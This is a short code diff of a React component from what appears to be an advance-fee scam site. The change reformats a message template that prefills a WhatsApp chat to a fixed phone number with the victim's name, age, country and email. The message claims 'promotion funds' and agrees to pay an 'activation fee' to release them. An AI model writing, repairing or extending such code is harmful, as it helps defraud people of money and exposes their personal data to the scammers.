@@ -727,8 +727,7 @@ function ProfileCusto({ name, country, balance, currency }) {
 function CongratsMessage({ balance, currency, custoName, activate }) {
   const { name, age, userEmail, userPhoneNum, country } = custoName;
   const encodedmessge =
-    encodeURIComponent(`Hello ADF, My name is ${name} ${age} years old from ${country}, Email: ${userEmail}. I am here to claim 
-    my PROMOMITION Funds of ${currency} ${balance}. I am ready to complete the process by paying the activition fee of ${currency} ${activate}.
+    encodeURIComponent(`Hello ADF, My name is ${name} ${age} years old from ${country}, Email: ${userEmail}. I am here to claim my PROMOMITION Funds of ${currency} ${balance}. I am ready to complete the process by paying the activition fee of ${currency} ${activate}.
      `);
 
   const whatAppURL = `https://wa.me/+254107545643?text=${encodedmessge}`;
